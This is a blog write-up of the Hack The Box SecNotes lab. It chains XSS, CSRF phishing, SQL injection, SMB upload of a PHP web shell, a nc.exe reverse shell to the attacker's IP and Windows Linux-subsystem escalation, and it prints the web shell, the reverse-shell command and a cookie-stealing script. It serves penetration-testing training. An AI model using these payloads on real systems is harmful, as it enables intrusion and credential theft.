---
layout: post
title:  "SecNotes Writeup - Hack The Box"
date:   2025-07-22
desc: ""
keywords: "HTB,OSCP,eWPT,Windows,Reflected XSS,Stored XSS,CSRF,SQLi,IIS Exploitation,Linux Subsystem Abuse,Information Leakage,Medium"
categories: [HTB]
tags: [HTB,OSCP,eWPT,Windows,Reflected XSS,Stored XSS,CSRF,SQLi,IIS Exploitation,Linux Subsystem Abuse,Information Leakage,Medium]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

My series of **Windows** machines continues and it is time to face one, whose difficulty was rated as **Medium** by the community, which I actually rated as **Hard**, because it was very difficult to find the attack vector that would allow me to access the system, but I imagine that other more experienced users did not find it so difficult. I loved the creativity required to find the right way and I was able to investigate, learn and exploit a **subsystem** in **Windows**, a concept that very few times I have been able to attack. I log into my **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** account to spawn and start my writeup.

<br /><br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

With `ping` I send a trace to the lab **IP** and the command output informs me that the packets were received correctly, so the connectivity is established through the **VPN**. With `whichSystem.py` tool developed by **[hack4u](https://hack4u.io/){:target="_blank"}** community I can know the **OS** installed on the target machine (**Windows**). Now if I can start the most important phase of any **Pentest** or **Audit** in a real environment, the **Reconnaissance**, and with the `nmap` tool I get the list of open ports, I will also take advantage of their custom scripts to leak information about the services and their versions. There are not many ports that I find but I already find important information such as the possible **OS version**. I'm going to focus on the **HTTP** protocol (port **80** and **8808**) which presents a large attack surface, with `whatweb` and **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** I disclose the technology stack behind the web application, in which I find some very interesting data like the versions.

```bash
ping -c 2 10.10.10.97
whichSystem.py 10.10.10.97
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.97 -oG allPorts
nmap -sCV -p80,445,8808 10.10.10.97 -oN targeted
cat targeted
# Microsoft IIS httpd 10.0
# Windows 10 Enterprise 17134

whatweb http://10.10.10.97 http://10.10.10.97:8808
# http://10.10.10.97/login.php
# http://10.10.10.97:8808
```

<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Since I can't access shared resources, using the **SMB** protocol, with tools like `smbmap` or `smbclient`, I'm going to resume my investigation of the **HTTP**. I perform some common attacks, such as a **SQLi** in the authentication panel, but it does not seem vulnerable to simple injections. But since the web application allows me to create an account, I'm going to skip performing a bypass to login for the time being, I also have the **account recovery** option (a fact I'll keep in mind). I **signin** with the newly created account and the application allows me to create notes, so I will take advantage of the fact that I can interact with the system and try to perform an **HTML injection** and then an **XSS reflected**, which are successful.

```bash
smbclient -L 10.10.10.97 -N
smbmap -H 10.10.10.97 -u 'null' --no-banner
# NT_STATUS_ACCESS_DENIED

# http://10.10.10.97/login.php
# admin, admin' or sleep(5)-- - ...

# http://10.10.10.97/home.php
# tyler@secnotes.htb

# HTML Injection: <marquee>oldboy was here</marquee>        :)
# XSS: <script>alert(1);</script>                           :)
```

<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

As the web application is vulnerable to **XSS** I'm also going to try to perform an **XSRF**, so I perform a test before thinking about any attack using this vector. First I start a local server with `python` and then I inject the malicious **JavaScript** code to send a request for a resource to it, and indeed I can catch the request. The first thing that comes to my mind is to steal the session cookie via **XSRF**, but once I inject the code I don't get any request where the cookie value is leaked. As it seems that there is a user in charge of analyzing the sent messages, I can try with a **Phishing** and inject directly the **URL** with the **IP** of my attacker machine, and after waiting a while I succeed in catching the incoming connection with `nc`.

> **XSRF**, also known as **CSRF** (**Cross-Site Request Forgery**), is a type of security vulnerability where an attacker tricks a user into performing actions on a website they are already authenticated to, without the user's knowledge or consent.

```bash
python3 -m http.server 80
# XSRF or CSRF: <script src="http://10.10.14.9/test"></script>      :)

# http://10.10.10.97/contact.php

python3 -m http.server 80
# <script>document.location('http://10.10.14.9/?cookie=' + document.cookie)</script>      :(
# http://10.10.14.9/testing                                                               :)
```

<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I can already find a possible attack vector to access the web application with the user **tyler's** account. I have to combine the different functionalities and vulnerabilities I succeeded to exploit. My goal is to update **tyler's** password through a **Phishing** exploiting the **XSRF**. The first step is to catch with **BurpSuite** the request sent to the server, when a password update request is made. This way I can analyze the packet sent to know what data is sent, I will also change the **POST** method used to **GET** to build my malicious link. The next thing is to inject the **URL** to perform the phishing attack to the user **tyler** and after waiting a while I try to access successfully with the password I defined in the link. In one of the notes I find credentials corresponding to the compromised user and with `crackmapexec` I check that they are valid.

```bash
# http://10.10.10.97/change_pass.php

burpsuite &> /dev/null & disown
# Change request method (to create the Phishing URL)
# /change_pass.php?password=oldboy123&confirm_password=oldboy123&submit=submit

# http://10.10.10.97/contact.php
# http://10.10.10.97/change_pass.php?password=oldboy123&confirm_password=oldboy123&submit=submit
# http://10.10.10.97/login.php

crackmapexec smb 10.10.10.97 -u 'tyler' -p '92...*&'       # :)
```

<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Another vector that I did not test is to use a **SQLi** in the registration form, I had tested only for the authentication panel. And if I create a new account using a simple injection I succeed to do a bypassing, this way I succeed to leak from the **Database** all the notes, including the one containing the user **tyler's** credentials. As I don't have any protocol that allows me to connect to the machine remotely, I use the credentials I just found to connect via **SMB** with `smbclient`, and now I find a shared resource (**new-site**) that I can access. I list the contents of this shared resource and they seem to be those of the web application available on port **8808**, I perform a test to load a **.php** file and confirm my suspicions when I can access the file from the web, and the most important thing is that the **PHP** code is interpreted by the server.

```bash
# http://10.10.10.97/register.php
# ' or 1=1-- -, oldboy123, oldboy123        :)

smbclient -L 10.10.10.97 -U 'tyler%92...*&'
smbclient //10.10.10.97/new-site -U 'tyler%92...*&'
  dir

nvim test.php
cat !$
smbclient //10.10.10.97/new-site -U 'tyler%92...*&'
  put test.php
  dir

# http://10.10.10.97:8808/test.php
# :)
```

<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Accessing the machine is my next goal, so I'm going to upload a **PHP web shell** that will allow me to execute command first and then with the help of `nc.exe` I will try to get a **Reverse Shell**. My first step is to upload `nc.exe` as a shared resource with `smbclient` and then with the web shell I just need to execute the right command to send the **Rerverse Shell**, finally I'm going to catch with `nc` the incoming connection on port **443**. Finally I could access the machine and I can start enumerating the system, I find no special privileges and there are only two accounts in the system (**Administrator** and **tyler**) besides the typical ones in a **Windows** environment. In the Desktop directory of **tyler's** account I find and can see the contents of the first flag, plus several very suspicious **shortcuts**.

> **Attacker Machine**:

```bash
nvim pwn3d.php
cat pwn3d.php
```

> **pwn3d.php**:

```php
<?php
  echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

```bash
# http://10.10.10.97:8808/pwn3d.php?cmd=whoami

locate nc.exe | grep -v al3j0
cp /usr/share/SecLists/Web-Shells/FuzzDB/nc.exe .
smbclient //10.10.10.97/new-site -U 'tyler%92...*&'
  put pwn3d.php
  put nc.exe
rlwrap -cAr nc -nlvp 443

# http://10.10.10.97:8808/pwn3d.php?cmd=nc.exe -e cmd 10.10.14.9 443
```

> **Victime Machine**:

```cmd
whoami
hostname
whoami /priv
whoami /all
net user
```

<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Of the shortcuts, the most interesting is **bash.lnk**, if I analyze its content with `type`, it succeeds to leak the path and the name (**bash.exe**) of the binary to which it is linked, but if I try to execute it using the absolute path it seems that the binary does not exist or is not recognized by the **CMD** shell. So I do a recursive search in the system for the binary and after waiting a while I find it in a path that would have **taken me years**, if I did a manual search. Now if I run it and despite the error messages, I succeed in migrating to a **Linux** subsystem, **how crazy**, and I'm impersonating the **root** user. If I access the HOME directory of the **root** user I find no flags but in the **.bash_history** command history I find the credentials of the **administrator** user. With `crackmapexec` I verify that the credentials are valid and with `impacket-psexec` I can access the system as the user with maximum privilege. Now I can see the content of the last flag, pwned machine!

> **Victime Machine**:

```cmd
cd \tyler\Desktop
type bash.lnk
# C:\Windows\System32\bash.exe"...

C:\Windows\System32\bash.exe"       # :(
where /R C:\ bash.exe
# C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe

C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
# mesg: ttyname failed: Inappropriate ioctl for device    :)

whoami
pwd

cd root
cat .bash_history
# smbclient -U 'administrator%u6...h' \\\\127.0.0.1\\c$
```

> **Attacker Machine**:

```bash
crackmapexec smb 10.10.10.97 -u 'Administrator' -p 'u6...nh'
impacket-psexec WORKGROUP/Administrator@10.10.10.97 cmd.exe
```

<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_37.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_38.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> What a great **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** machine, I never cease to be amazed by the **creativity** with which they create and setup each lab. The vulnerabilities and exploit methods take me quite a while to decipher, but every time I succeed there is a **huge** sense of **satisfaction**. I continue my practice, so I'm going to kill the box from my account and look for the next challenge.

<br /><br />
<img src="{{ site.img_path }}/secnotes_writeup/SecNotes_39.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
